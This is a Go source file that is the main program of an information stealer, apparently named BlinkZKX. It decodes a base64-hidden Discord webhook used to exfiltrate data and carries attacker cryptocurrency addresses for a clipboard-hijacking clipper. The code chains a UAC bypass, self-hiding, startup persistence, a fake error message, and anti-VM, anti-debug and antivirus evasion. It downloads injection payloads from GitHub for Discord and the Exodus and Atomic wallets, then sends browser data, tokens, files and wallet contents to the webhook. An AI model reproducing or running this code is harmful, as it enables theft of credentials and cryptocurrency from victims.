package main

import (
	"encoding/base64"
	"reflect"
	"time"

	"github.com/B1nkZK/BlinkZKX/modules/antidebug"
	"github.com/B1nkZK/BlinkZKX/modules/antivm"
	"github.com/B1nkZK/BlinkZKX/modules/antivirus"
	"github.com/B1nkZK/BlinkZKX/modules/browsers"
	"github.com/B1nkZK/BlinkZKX/modules/clipper"
	"github.com/B1nkZK/BlinkZKX/modules/commonfiles"
	"github.com/B1nkZK/BlinkZKX/modules/discodes"
	"github.com/B1nkZK/BlinkZKX/modules/discordinjection"
	"github.com/B1nkZK/BlinkZKX/modules/fakeerror"
	"github.com/B1nkZK/BlinkZKX/modules/games"
	"github.com/B1nkZK/BlinkZKX/modules/hideconsole"
	"github.com/B1nkZK/BlinkZKX/modules/startup"
	"github.com/B1nkZK/BlinkZKX/modules/system"
	"github.com/B1nkZK/BlinkZKX/modules/tokens"
	"github.com/B1nkZK/BlinkZKX/modules/uacbypass"
	"github.com/B1nkZK/BlinkZKX/modules/wallets"
	"github.com/B1nkZK/BlinkZKX/modules/walletsinjection"
	"github.com/B1nkZK/BlinkZKX/utils/program"
)

// Decrypt a base64-encoded string at runtime
func decrypt(encoded string) string {
	data, _ := base64.StdEncoding.DecodeString(encoded)
	return string(data)
}

// Dynamically execute a method from a module
func dynamicRun(module interface{}, methodName string) {
	moduleValue := reflect.ValueOf(module)
	method := moduleValue.MethodByName(methodName)
	if method.IsValid() {
		method.Call(nil)
	}
}

func main() {
	// Encrypted webhook URL for runtime decryption
	encryptedWebhook := "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTMyNzA4NzAyNzQyNjE2ODg4Mi9iUmYyd3dJX01pdHJkNi1hX2hYUjg2SjZaOERPcUd0NkhRUVd3Y1dBZ1MwVnVnNS1aRERRSXFhZzFkbkRHWkFnMVZrVmQ="
	webhook := decrypt(encryptedWebhook)

	// Encrypted cryptocurrency addresses
	encryptedCryptos := map[string]string{
		"BCH":  "YmMxZWUwMGZ2dDByMjNkcHo5aTIwNnZrYTV0cTR2dGZ3NA==",
		"ETH":  "MHg3ZDRmYjFjMTc3NDk4M0YzMzhhMzQ0MDk1NGUzNDM3MjVFMUY3ZTc=",
		"XMR":  "MHg4MTBBMDI5NjVhQ0MzZDJkZmY2ZTQ4ODdmMTVjN0ZBN0E3QkI4QjM2",
		"LTC":  "bHRjMXFlZXV3MG4zczk4bXU0ajkyOGc5OTc1NmwwcWN3ajJmM3E0dWFjYQ==",
		"DOGE": "RFF0SGU1QTZNYkZnbU5HNXppek9KSFRyYTZzcXBZaHRRVg==",
		"XLM":  "R0FMVVUzRzMzU0FaUllJSUMzRTRBN1ZZUlpKS0hVSEtDSVM2N1VRVk03QkFYT0FBNEY1UUZBNQ==",
		"TRX":  "VFVOUkNKaHl1R1N2TXMxVjV4ZGVkU2ptd3N6akVBekNkUw==",
		"ADA":  "YWRkcjFxOGtwcXA4ODg4eGYyNGUzNGFwYzZrNDhzM3lwdTZxbnhwYzkyYXBheTlzanBqMGRzdWU4bG41eWp5eG5hMHlmcmZhaDRtdng0OTdhbW5xMDhodGZnc2prN3Foc2t1dHF0dw==",
		"DASH": "WGhwdXpVUDVxZHp2cFRjMXRkTHJwQk1udEtiY2N5RExjMjQ=",
		"ETC":  "MHg4MTBBMDI5NjVhQ0MzZDJkZmY2ZTQ4ODdmMTVjN0ZBN0E3QkI4QjM2",
	}

	// Decrypt all crypto addresses at runtime
	cryptos := make(map[string]string)
	for key, value := range encryptedCryptos {
		cryptos[key] = decrypt(value)
	}

	// Check if the program is already running
	if program.IsAlreadyRunning() {
		return
	}

	// Execute stealth and persistence mechanisms
	uacbypass.Run()
	hideconsole.Run()
	program.HideSelf()

	// If not in the startup path, execute startup-related functions
	if !program.IsInStartupPath() {
		go fakeerror.Run()
		go startup.Run()
	}

	// Execute anti-analysis 
	antivm.Run()
	go antidebug.Run()
	go antivirus.Run()

	// Execute Dis
	go discordinjection.Run(
		"https://raw.githubusercontent.com/B1inkZK/discord-injection/main/injection.js",
		webhook,
	)
	go walletsinjection.Run(
		"https://github.com/B1inkZK/wallets-injection/raw/main/atomic.asar",
		"https://github.com/B1inkZK/wallets-injection/raw/main/exodus.asar",
		webhook,
	)

	// Define and execute a list of actions dynamically
	actions := []func(string){
		system.Run,
		browsers.Run,
		tokens.Run,
		discodes.Run,
		commonfiles.Run,
		wallets.Run,
		games.Run,
	}

	for _, action := range actions {
		go action(webhook)
	}

	// Run the clipboard 
	clipper.Run(cryptos)

	// Add a delay to evade sandboxes
	time.Sleep(30 * time.Second)
}
